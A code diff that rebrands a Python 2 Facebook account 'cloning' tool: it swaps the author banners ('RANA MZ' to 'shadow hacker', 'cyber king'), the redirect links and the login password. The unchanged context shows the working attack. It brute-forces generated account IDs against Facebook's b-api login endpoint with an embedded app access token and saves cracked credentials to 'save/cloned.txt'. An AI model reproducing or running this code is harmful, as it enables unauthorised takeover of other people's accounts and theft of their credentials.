@@ -1,4 +1,4 @@
-# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
+# Ustad# Sana# Thuglife# Shadow hacker# cyber hunter#!/usr/bin/python2
 #coding=utf-8
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
@@ -80,7 +80,7 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;91m\x1b[1;92m░░    🆁🅰🅽🅰 🅼🆉
+\033[1;91m\x1b[1;92m░░    🆂🅷🅰🅳🅾🆆 🆃🅾🅾🅻
 
                            █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
@@ -97,21 +97,21 @@ print  """
 
 
 \033[1;97m\x1b[1;96m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;91m\x1b[1;91mAuthor : RANA MZ
+\033[1;91m\x1b[1;91mAuthor : shadow hacker
                     
-\033[1;94m\x1b[1;94mFACEBOOK RANA MZ
+\033[1;94m\x1b[1;94mFACEBOOK cyber king 
                      
-\x1b[1;94m RANA MZ
+\x1b[1;94m Kashmiri hacker
      \x1b[1;93m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;96m.\x1b[1;92m RANA MZ
+\033[1;96m.\x1b[1;92m black hat
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••                
-\033[1;92m-\x1b[1;94m Rana MZ--------------------------------------
+\033[1;92m-\x1b[1;94m Cyber king--------------------------------------
 """
 
 ####Logo####
 
 logo1 = """
-\033[1;91m\x1b[1;94m_______________╭━━━━━━━╮🆁🅰🅽🅰 🅼🆉
+\033[1;91m\x1b[1;94m_______________╭━━━━━━━╮🆂🅷🅰🅳🅾🆆 🆃🅾🅾🅻
 ┃　　● ══　    ┃
 ┃███████┃
 ┃███████┃
@@ -124,27 +124,27 @@ logo1 = """
 ┃　　 　O　  　  ┃
 ╰━━━━━━━╯
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;96m-\x1b[1;93mThe Credit For This Code Goes To RANA MZ ..
+\033[1;96m-\x1b[1;93mThe Credit For This Code Goes To Kashmiri hacker ..
 \033[1;97m
                      
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
 """
 logo2 = """
-\033[1;91m\x1b[1;93m RANA MZ
+\033[1;91m\x1b[1;93m haters k bap Ravi Kumar name tu suna hoga
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••    ..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 
                      
-\033[1;94mFACEBOOK-\x1b[1;94m RANA MZ
+\033[1;94mFACEBOOK-\x1b[1;94m cyber king
                       
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;96m -\x1b[1;92 CLONING IN Pakistani IDZ
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
                                                 
-\033[1;97m----------------------\x1b[1;96m IM THE ONE Hackers Pakistan--------------------
+\033[1;97m----------------------\x1b[1;96m IM THE father of all hackers in the world-------------------
 """
-CorrectUsername = "no need"
-CorrectPassword = "ranamz"
+CorrectUsername = "ok"
+CorrectPassword = "ok"
 
 loop = 'true'
 while (loop == 'true'):
@@ -157,10 +157,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://youtu.be/Q86vnZCLkCI')
+            os.system('xdg-open https://facebook.com/100006455309918')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://youtu.be/Q86vnZCLkCI')
+        os.system('xdg-open https://facebook.com/100006455309918')
 
 
 
@@ -242,14 +242,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;95m(MZ)  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;95m(shadow)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m(\x1b[1;95mRANA MZ) ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m(\x1b[1;95mcp) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -259,7 +259,7 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;91m(OPEN)  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;91m(shadow)  ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
@@ -350,7 +350,7 @@ def action():
     print ''
     print """
     ███
-──────────███║Z║E║S║H║I║║███
+──────────███║🆂🅷🅰🅳🅾🆆███
 \033[1;95mFb\033[1;97m 
 \033[1;95m033[1;97m"""
 
